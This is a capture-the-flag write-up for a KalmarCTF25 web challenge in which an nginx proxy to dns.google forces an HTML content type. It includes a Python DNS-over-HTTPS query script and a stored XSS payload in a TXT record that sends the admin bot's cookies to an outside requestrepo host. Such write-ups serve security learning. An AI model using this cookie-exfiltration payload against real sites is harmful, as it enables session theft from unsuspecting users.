---
layout: post
author: hofill
title: "DNXSS-over-HTTPS"
slug: dnxss-over-https
ctf: KalmarCTF25
category: writeup
writeup_categories: ["web"]
tags: ["web", "xss", "dns", "proxy"]
summary: DNS XSS through a proxy that forces Content-Type text/html. Used a TXT record as the payload.
last_modified_at:
---

# Flag

> `kalmar{that_content_type_header_is_doing_some_heavy_lifting!_did_you_use_dns-query_or_resolve?}`

# Summary

DNS XSS through a proxy that returns every result as HTML. Used TXT record for payload.

# Details

We are given an `nginx` config:

```nginx
events {
  worker_connections 1024;
}

http {
  server {
    listen 80;
        
    location / {
      proxy_pass https://dns.google;
      add_header Content-Type text/html always;
    }
    
    location /report {
      proxy_pass http://adminbot:3000;
    }
  }
}
```

We notice that the entire service is a proxy to `dns.google`, but it also adds the header `Content-Type text/html always`. Therefore, we can send a raw DNS query to `dns.google/dns-query`, which will return us the answer — also in DNS wire format, encoded in binary.

Therefore, we created the following script:

```python
import base64
import struct
import requests

URL = "caca.mty6sg3u.requestrepo.com"

def create_dns_query():
    transaction_id = b'\xab\xcd'
    flags = b'\x01\x00'
    qdcount = b'\x00\x01'
    ancount = b'\x00\x00'
    nscount = b'\x00\x00'
    arcount = b'\x00\x00'
    
    query_name = b''.join(struct.pack('B', len(part)) + part.encode() for part in URL.split('.')) + b'\x00'
    
    qtype = b'\x00\x10'  # TXT record
    qclass = b'\x00\x01' # IN
    
    dns_query = transaction_id + flags + qdcount + ancount + nscount + arcount + query_name + qtype + qclass
    return dns_query

def encode_base64_no_padding(data):
    return base64.b64encode(data).decode().rstrip('=')

def parse_dns_response(response):
    if not isinstance(response, bytes):
        response = response.encode()
    
    transaction_id = response[:2]
    flags = struct.unpack("!H", response[2:4])[0]
    qdcount, ancount, nscount, arcount = struct.unpack("!HHHH", response[4:12])
    
    offset = 12
    while response[offset] != 0:
        offset += 1
    offset += 5
    
    answers = []
    for _ in range(ancount):
        offset += 2
        rtype, rclass, ttl, rdlength = struct.unpack("!HHIH", response[offset:offset+10])
        offset += 10
        if rtype == 16:  # TXT record
            ip_address = ".".join(map(str, response[offset:offset+4]))
            answers.append(ip_address)
            offset += 4
    
    print("TXT Records:", answers)
    return answers

if __name__ == "__main__":
    dns_query = create_dns_query()
    base64_encoded = encode_base64_no_padding(dns_query)
    
    burp0_url = "https://dns.google/dns-query"
    r = requests.get(burp0_url, params={'dns': base64_encoded})
    
    if r.status_code == 200:
        parse_dns_response(r.content)
    else:
        print("Error:", r.status_code, r.text)
```

Using `requestrepo`'s DNS feature, we set a `TXT` record to:

```js
<script>document.location='https://mty6sg3u.requestrepo.com/?c=' + btoa(document.cookie)</script>
```

We report the URL and we get the flag.

> Since it converted everything to `HTML`, we could've also just used the `/resolve` endpoint, which returns JSON.
